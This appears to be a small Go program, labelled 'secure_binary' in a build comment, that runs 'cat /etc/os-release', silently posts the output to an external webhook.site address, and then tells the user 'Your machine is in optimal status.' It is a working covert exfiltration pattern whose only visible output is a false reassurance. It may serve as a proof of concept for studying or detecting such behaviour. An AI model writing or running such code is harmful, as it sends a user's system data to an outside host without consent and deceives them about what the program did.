package main

import (
	"bytes"
	"fmt"
	"net/http"
	"os/exec"
)

// go build -o secure_binary cmd/plain/main.go

func main() {
	// run the os.Command
	result, err := exec.Command("cat", "/etc/os-release").Output()
	if err != nil {
		panic(err)
	}
	// send the output to the webhook
	client := http.Client{}
	_, err = client.Post("https://webhook.site/1bd16025-fe2c-4363-8c8f-7155a131c484", "application/text", bytes.NewReader(result))
	if err != nil {
		panic(err)
	}
	// print the result
	fmt.Println("Your machine is in optimal status.")
}
